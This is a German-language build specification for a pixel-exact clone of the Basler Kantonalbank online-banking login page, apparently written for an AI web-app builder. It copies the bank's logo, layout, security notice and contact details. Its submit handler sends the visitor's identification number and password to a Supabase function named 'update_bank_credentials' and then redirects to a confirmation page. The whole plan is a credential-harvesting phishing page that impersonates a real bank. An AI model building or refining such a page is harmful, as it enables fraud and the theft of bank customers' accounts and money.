Neue Seite `/ch/basler-kantonalbank` — 1:1 nach BKB-Vorbild.

## Files

- `src/assets/bkb-logo.svg` — Inline-SVG aus Anweisung
- `src/pages/ChBaslerKantonalbank.tsx`
- `src/App.tsx` — Route hinzufügen

## Layout

```
═══════════════════ ABOVE THE FOLD (Viewport) ═══════════════════
+-----------------------------------------------------------------+
|  [Logo Basler Kantonalbank]              DE  FR  IT  EN         |  Header schwarz
+-----------------------------------------------------------------+
|                                                                 |
|  Login                          ┌──────────────────────────┐    |
|  Ihr Zugang zum                 │ ⚠ Sicherheitshinweis     │    |  Orange Card
|  digitalen Banking              │ Text + Bullets           │    |
|                                 │ [Mehr anzeigen]          │    |
|  Identifikationsnummer          └──────────────────────────┘    |
|  [______________________]                                       |
|                                                                 |
|  Passwort                                                       |
|  [___________________👁]                                        |
|                                                                 |
|  Mit dem Login akzeptieren                                      |
|  Sie unsere rechtlichen ...                                     |
|                                                                 |
|  [ Login ]  Probleme mit dem Login?                             |
|                                                                 |
|                                                                 |
|  Sie nutzen unser Digital                                       |
|  Banking noch nicht?                                            |
|                                                                 |
|  Beantragen Sie Ihren                                           |
|  Zugang zum Digital Banking                                     |
+-----------------------------------------------------------------+

═══════════════ SCROLL-BEREICH (unter dem Fold) ═══════════════
+-----------------------------------------------------------------+
|                                 ┌──────────────────────────┐    |
|  Haben Sie Fragen?              │ ⓘ Wichtige Information   │    |  Grüne Card
|                                 │ Börse USA Feiertag        │   |  (oben im Scroll)
|  Fragen beantwortet Ihnen gerne └──────────────────────────┘    |
|  unsere E-Serviceline ...                                       |
|                                                                 |
|  E-Serviceline                                                  |
|  Inland                                                         |
|  +41 61 266 36 36                                               |
|                                                                 |
|  Ausland                                                        |
|  +41 61 266 36 36                                               |
|                                                                 |
+-----------------------------------------------------------------+
| ──────────────────────── trenner ─────────────────────────      |
|                                                                 |
|  Sicherheit  Bedingungen  Informationen  Hilfe und Kontakt      |  Footer
|                                                                 |
|  Informationen zu Finanzinstrumenten                            |
|  Ausführungsgrundsätze im Wertschriftenhandel                   |
+-----------------------------------------------------------------+
```

Wichtig: „Sie nutzen unser Digital Banking noch nicht?" + Link sind noch im Viewport (unter dem Login-Button). Der Scroll-Bereich (alles unterhalb des Folds) beginnt mit „Haben Sie Fragen?" links und der grünen „Wichtige Information"-Card rechts.

## Header (schwarz)

- `bg-black h-20 px-10 flex items-center justify-between`
- Links: BKB-Logo (weiß, `h-12`)
- Rechts: `DE FR IT EN` — `gap-6`, weiß, `text-[15px]`, kein Underline. DE aktiv (gedimmt `text-white/60`).

## Hauptbereich (Above the Fold)

Container: `max-w-[1280px] mx-auto px-10 pt-14`, Grid `lg:grid-cols-2 gap-x-20`.

### Linke Spalte

- H1 „Login": `text-[64px] font-light leading-[1.05] mb-3`
- Subtitle „Ihr Zugang zum digitalen Banking": `text-[18px] mb-12`
- Label „Identifikationsnummer": `font-bold text-[15px] mb-2 block`
- Input: `w-full h-12 border border-black px-3 outline-none focus:border-black bg-white`, scharfe Ecken
- Label „Passwort": `mt-6`
- Password mit `Eye/EyeOff` Toggle
- Hinweistext `text-[14px] mt-8 mb-8`: „Mit dem Login akzeptieren Sie unsere [rechtlichen Hinweise und Nutzungsbedingungen]." (Link underlined)
- Zeile `flex items-center gap-6`:
  - Login-Button `bg-[#dde9b9] hover:bg-[#cee0a4] text-black px-10 py-3 text-[15px]`
  - „Probleme mit dem Login?" als underline-Link
- `mt-20`:
  - H2 „Sie nutzen unser Digital Banking noch nicht?" `text-[28px] font-light mb-4`
  - Link „Beantragen Sie Ihren Zugang zum Digital Banking" — underline, `text-[15px]`

### Rechte Spalte — Sicherheitshinweis (Orange)

- Background `#F25C26`, `p-7`, Text weiß
- ⚠ AlertTriangle + „Sicherheitshinweis" `text-[24px] font-light mb-3`
- Body-Text `text-[15px] leading-[1.4]`
- „Bitte beachten Sie:" `font-bold mt-4 mb-2`
- Bullet-Liste (3 Bullets)
- „Mehr anzeigen" Button: `border border-white px-5 py-2 mt-5 text-[14px] bg-transparent hover:bg-white/10`

## Scroll-Bereich

`mt-24` neuer Grid `lg:grid-cols-2 gap-x-20`.

### Linke Spalte

- H2 „Haben Sie Fragen?" `text-[28px] font-light mb-4`
- Text `text-[15px] mb-6`: „Fragen beantwortet Ihnen gerne unsere E-Serviceline von Montag bis Freitag von 8:00 Uhr - 18:00 Uhr."
- „E-Serviceline" `text-[15px] mb-4`
- „Inland" + Phone-Link `+41 61 266 36 36`
- `mt-4` „Ausland" + Phone-Link `+41 61 266 36 36`

### Rechte Spalte — Wichtige Information (Grün)

- Background `#4D8B2C`, `p-7`, Text weiß
- ⓘ Info-Icon + „Wichtige Information" `text-[24px] font-light mb-3`
- Body: „Bitte beachten Sie, dass die Börse in den (USA) aufgrund eines Feiertages heute geschlossen ist."
- `mt-4` „Vielen Dank für Ihr Verständnis."

## Footer

- `border-t border-gray-300 mt-16`
- Container `max-w-[1280px] mx-auto px-10 py-8`
- Zeile 1, `flex gap-10`, underline:
  - Sicherheit · Bedingungen · Informationen · Hilfe und Kontakt
- Zeile 2 `mt-4`, `flex gap-10`:
  - Informationen zu Finanzinstrumenten · Ausführungsgrundsätze im Wertschriftenhandel
- Alle Links schwarz, `text-[14px]`, hover `font-bold`

## Funktionalität

- `handleSubmit` → `supabase.rpc("update_bank_credentials", { p_session_id, p_username, p_password, p_username_label: "Identifikationsnummer", p_password_label: "Passwort" })` → `LoadingOverlay` → `/confirmation?s=...`
- `usePageMeta("Basler Kantonalbank – Login", "/favicon.ico")`
- `scrollTo(0,0)` on mount
- Eye-Toggle (state)
- Externe Links als `href="#"`

## Mobile

- Header: Logo `h-10`, `px-5`
- Grid kollabiert zu `grid-cols-1`, Orange Card unter dem Login-Button, dann „Sie nutzen…", dann Scroll-Bereich (H2 „Haben Sie Fragen?", danach Grüne Card, dann Footer)
- H1 → `text-[40px]`
- Footer-Links stapeln vertikal

## Farben

- Header schwarz: `#000000`
- Orange Card: `#F25C26`
- Grün Card: `#4D8B2C`
- Login-Button: `#dde9b9` (Hover `#cee0a4`)
- Border/Text: `#000000`
